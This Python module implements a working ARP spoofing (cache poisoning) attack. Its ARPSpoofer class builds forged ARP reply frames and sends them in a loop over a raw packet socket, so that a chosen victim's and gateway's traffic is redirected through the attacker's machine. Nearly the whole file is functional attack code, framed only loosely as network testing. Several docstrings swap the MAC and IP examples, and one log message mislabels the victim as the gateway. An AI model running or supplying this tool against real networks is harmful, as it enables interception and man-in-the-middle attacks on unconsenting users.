#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The module for ARP spoofing class"""


import socket
import textwrap
import time
import logging

from .helpers import make_valid_mac_address, validate_ip_address


_LOGGER = logging.getLogger(__name__)


class ARPSpoofer:
    """A class that represents an ARP spoofing attack"""

    def __init__(self, interface, your_mac):
        """
        Initialaze an ARPSpoofer object

        :interface: your network interface that is connected
                    to the tested network (i.e wlan0)
        :your_mac: your MAC-address (b"\xbb\xbb\xbb\xbb\xbb\xbb"
                                     == bb:bb:bb:bb:bb:bb)
        """
        self.interface = interface
        self.mac = make_valid_mac_address(your_mac)
        if interface and your_mac:
            _LOGGER.debug(
                "Creating an ARPSpoofer object with your interface %s"
                " and MAC-address %s",
                self.interface,
                your_mac,
            )
        self.description = textwrap.dedent(
            """\
            The ARP spoofing attack description:

            In computer networking, ARP spoofing, ARP cache poisoning,
            or ARP poison routing, is a technique by which an attacker
            sends (spoofed) Address Resolution Protocol (ARP) messages
            onto a local area network.
            Generally, the aim is to associate the attacker's MAC
            address with the IP address of another host, such as the
            default gateway, causing any traffic meant for that IP address
            to be sent to the attacker instead.

            Read more: https://www.wikiwand.com/en/ARP_spoofing
            """
        )

    def add_gateway(self, gateway_mac, gateway_ip):
        """
        Add info about the gateway

        :gateway_mac: gateway's MAC-address (i.e. "192.168.100.1")
        :gateway_ip: gateway's IP-address from your network
                     (i.e. b"\xaa\xaa\xaa\xaa\xaa\xaa" == aa:aa:aa:aa:aa:aa)
        """
        self.gateway_mac = make_valid_mac_address(gateway_mac)
        self.gateway_ip = socket.inet_aton(validate_ip_address(gateway_ip))
        _LOGGER.debug(
            "Adding gateway with MAC %s and IP %s", gateway_mac, gateway_ip
        )

    def add_victim(self, victim_mac, victim_ip):
        """
        Add info about the victim

        :victim_mac: victim's MAC-address (i.e. "192.168.100.2")
        :victim_ip: victim's IP-address from your network
                    (i.e. b"\xcc\xcc\xcc\xcc\xcc\xcc" == cc:cc:cc:cc:cc:cc)
        """
        self.victim_mac = make_valid_mac_address(victim_mac)
        self.victim_ip = socket.inet_aton(validate_ip_address(victim_ip))
        _LOGGER.debug(
            "Adding gateway with MAC %s and IP %s", victim_mac, victim_ip
        )

    def run(self):
        """Run the ARP spoofing attack until KeyboardInterrupt"""
        _LOGGER.warning(
            "Running the ARP spoofing attack. Press Ctrl+C to stop"
        )
        protocol = self._make_prototcol_headers()
        gateway_packet = self._make_packet_for_gateway()
        victim_packet = self._make_packet_for_victim()
        connect = socket.socket(
            socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)
        )
        connect.bind((self.interface, socket.htons(0x0800)))

        request_victim = (
            victim_packet
            + protocol
            + self.mac
            + self.gateway_ip
            + self.victim_mac
            + self.victim_ip
        )
        request_gateway = (
            gateway_packet
            + protocol
            + self.mac
            + self.victim_ip
            + self.gateway_mac
            + self.gateway_ip
        )
        while True:
            try:
                connect.send(request_victim)
                connect.send(request_gateway)
                time.sleep(1)
            except KeyboardInterrupt:
                _LOGGER.warning("Stopping ARP spoofing attack")
                break

    def _make_prototcol_headers(self):
        """Create protocol headers without MAC and IP addresses"""
        htype = b"\x00\x01"  # Hardware Type
        ptype = b"\x08\x00"  # Protocol Type
        hlen = b"\x06"  # Hardware Length
        plen = b"\x04"  # Protocol Length
        operation = b"\x00\x02"  # Operation Code - Response
        protocol = htype + ptype + hlen + plen + operation  # Body
        return protocol

    def _make_packet_for_gateway(self):
        """Create a packet sample that will be send to the gateway"""
        arp_code = b"\x08\x06"  # Protocol code
        gateway_packet = self.gateway_mac + self.mac + arp_code
        return gateway_packet

    def _make_packet_for_victim(self):
        """Create a packet sample that will be send to the victim"""
        arp_code = b"\x08\x06"  # Protocol code
        victim_packet = self.victim_mac + self.mac + arp_code
        return victim_packet
